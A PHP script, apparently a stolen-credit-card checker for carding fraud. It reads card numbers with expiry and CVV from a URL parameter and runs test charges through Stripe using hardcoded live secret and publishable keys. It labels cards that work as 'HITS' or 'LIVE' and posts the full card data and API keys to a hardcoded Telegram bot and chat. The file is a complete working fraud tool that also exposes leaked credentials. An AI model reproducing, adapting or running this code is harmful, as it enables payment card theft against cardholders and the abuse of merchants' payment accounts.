<?php

// ===============[API BY amaan_06 ]================
//error_reporting(0);

$start_time = microtime(true);

$card = $_GET["lista"] ?? '';
$mode = $_GET["mode"] ?? "cvv";
$amount = $_GET["amount"] ?? 1;
$currency = $_GET["currency"] ?? "usd";

if (empty($card)) {
    echo "Please enter a card number";
    exit();
}

$bt = '7346758158:AAGcbEptj5EsgnFGrTXF81ycCuQ_eje5GtY';
$idd = '-1002242325790';

$split = explode("|", $card);
$cc = $split[0] ?? '';
$mes = $split[1] ?? '';
$ano = $split[2] ?? '';
$cvv = $split[3] ?? '';

if (empty($cc) || empty($mes) || empty($ano) || empty($cvv)) {
    echo "Invalid card details";
    exit();
}

$pk = 'pk_live_51Ilh1wBWK6Bv9LQB36TY34yNVfyWXpVFH4FIx1rT0HoQSvhtQaulwKAmKcZIGLcoJYYt5ITaO7SIF3ZF0mpZhrfR00GnE4cO9l';
if(isset($_GET['pkkey'])){
    $pk = $_GET['pkkey'];
}

$sk = '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';
if(isset($_GET['skkey'])){
    $sk = $_GET['skkey'];
}
$tokenData = [
    'card' => [
        'number' => $cc,
        'exp_month' => $mes,
        'exp_year' => $ano,
        'cvc' => $cvv,
    ]
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($tokenData));
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Authorization: Bearer ' . $pk,
    'Content-Type: application/x-www-form-urlencoded',
]);

$tokenResponse = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
    exit();
}
curl_close($ch);

$tokenData = json_decode($tokenResponse, true);
if (isset($tokenData['error'])) {
    echo 'Error: ' . $tokenData['error']['message'];
    exit();
}

$tokenId = $tokenData['id'] ?? '';
if (empty($tokenId)) {
    echo 'Token creation failed';
    exit();
}

$chargeData = [
    'amount' => $amount * 100, 
    'currency' => $currency,
    'source' => $tokenId,
    'description' => 'Charge for product/service'
];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($chargeData));
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Authorization: Bearer ' . $sk,
    'Content-Type: application/x-www-form-urlencoded',
]);

// Execute cURL request for charge creation
$chargeResponse = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
    exit();
}
curl_close($ch);

$chares = json_decode($chargeResponse);
	
$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);

if (isset($chares->status) && $chares->status == "succeeded") {
    $status = "HITS";
    $resp = "Charged successfully ✅";
$msg = <<<EOT
┏━━━━━━━⍟
┃ 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
┗━━━━━━━━━━━⊛
⊛ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ➔ <code>{$card}</code>
⊛ 𝗥𝗘𝗦𝗣𝗢𝗡𝗖𝗘 ➔ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ✅
⊛ 𝗔𝗠𝗢𝗨𝗡𝗧 ➔ 1
⊛ 𝗦𝗞 𝗞𝗘𝗬 ➔ <code>{$sk}</code>
⊛ 𝗦𝗞 𝗞𝗘𝗬 ➔ <code>{$pk}</code>
⊛ 𝗖𝗛𝗘𝗖𝗞𝗘𝗗 𝗕𝗬 ➔ 𝗔𝗺𝗮𝗮𝗻 🇰🇼

 ❛ ━━━━･⌁ 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ⌁･━━━━ ❜
EOT;
   $apiToken = $bt;
    $logger = ['chat_id' => $idd,'text' => $msg,'parse_mode'=>'html' ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
} elseif (strpos(json_encode($chares), "Your card's security code is incorrect.") !== false) {
    $status = "CCN LIVE";
    $resp = "security code is incorrect✅";
$msg = <<<EOT
┏━━━━━━━⍟
┃ 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
┗━━━━━━━━━━━⊛
⊛ 𝗖𝗖𝗡 ➔ <code>{$card}</code>
⊛ 𝗥𝗘𝗦𝗣𝗢𝗡𝗖𝗘 ➔ Security Code Is Incorrect ✅
⊛ 𝗔𝗠𝗢𝗨𝗡𝗧 ➔ 1
⊛ 𝗦𝗞 𝗞𝗘𝗬 ➔ <code>{$sk}</code>
⊛ 𝗦𝗞 𝗞𝗘𝗬 ➔ <code>{$pk}</code>
⊛ 𝗖𝗛𝗘𝗖𝗞𝗘𝗗 𝗕𝗬 ➔ 𝗔𝗺𝗮𝗮𝗻 🇰🇼

 ❛ ━━━━･⌁ 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ⌁･━━━━ ❜
EOT;
   $apiToken = $bt;
    $logger = ['chat_id' => $idd,'text' => $msg,'parse_mode'=>'html' ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
} elseif (strpos(json_encode($chares), 'do_not_honor') !== false || strpos(json_encode($chares), 'do_not_honor') !== false) {
    $status = "CVV LIVE";
    $resp = "do_not_honor✅";
$msg = <<<EOT
┏━━━━━━━⍟
┃ 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
┗━━━━━━━━━━━⊛
⊛ 𝗖𝗩𝗩 : <code>{$card}</code>
⊛ 𝗥𝗘𝗦𝗣𝗢𝗡𝗖𝗘 ➔ Do Not Honor ✅
⊛ 𝗔𝗠𝗢𝗨𝗡𝗧 ➔ 1
⊛ 𝗦𝗞 𝗞𝗘𝗬 ➔ <code>{$sk}</code>
⊛ 𝗦𝗞 𝗞𝗘𝗬 ➔ <code>{$pk}</code>
⊛ 𝗖𝗛𝗘𝗖𝗞𝗘𝗗 𝗕𝗬 ➔ 𝗔𝗺𝗮𝗮𝗻 🇰🇼

 ❛ ━━━━･⌁ 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ⌁･━━━━ ❜
EOT;
   $apiToken = $bt;
    $logger = ['chat_id' => $idd,'text' => $msg,'parse_mode'=>'html' ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
} elseif (strpos(json_encode($chares), 'insufficient funds') !== false || strpos(json_encode($chares), 'Insufficient Funds') !== false) {
    $status = "CVV LIVE";
    $resp = "insufficient funds✅";
$msg = <<<EOT
┏━━━━━━━⍟
┃ 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
┗━━━━━━━━━━━⊛
⊛ 𝗖𝗩𝗩 : <code>{$card}</code>
⊛ 𝗥𝗘𝗦𝗣𝗢𝗡𝗖𝗘 ➔ Insufficient Funds ✅
⊛ 𝗔𝗠𝗢𝗨𝗡𝗧 ➔ 1
⊛ 𝗦𝗞 𝗞𝗘𝗬 ➔ <code>{$sk}</code>
⊛ 𝗦𝗞 𝗞𝗘𝗬 ➔ <code>{$pk}</code>
⊛ 𝗖𝗛𝗘𝗖𝗞𝗘𝗗 𝗕𝗬 ➔ 𝗔𝗺𝗮𝗮𝗻 🇰🇼

 ❛ ━━━━･⌁ 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ⌁･━━━━ ❜
EOT;
   $apiToken = $bt;
    $logger = ['chat_id' => $idd,'text' => $msg,'parse_mode'=>'html' ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
} else {
    $status = "Declined ❌️";
    
    $resp = $chares->error->decline_code ?? $chares->error->message ?? 'Unknown error';
}

echo $status . '<br>' .
     '➔ ' . $card . '<br>' .
     '➔ [ ' . $resp . ' ]<br><br>';

function create_rnd_str($length = 16)
{
    $chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $chars_length = strlen($chars);
    $str = '';
    for ($i = 0; $i < $length; $i++) {
        $str .= $chars[rand(0, $chars_length - 1)];
    }
    return $str;
}

?>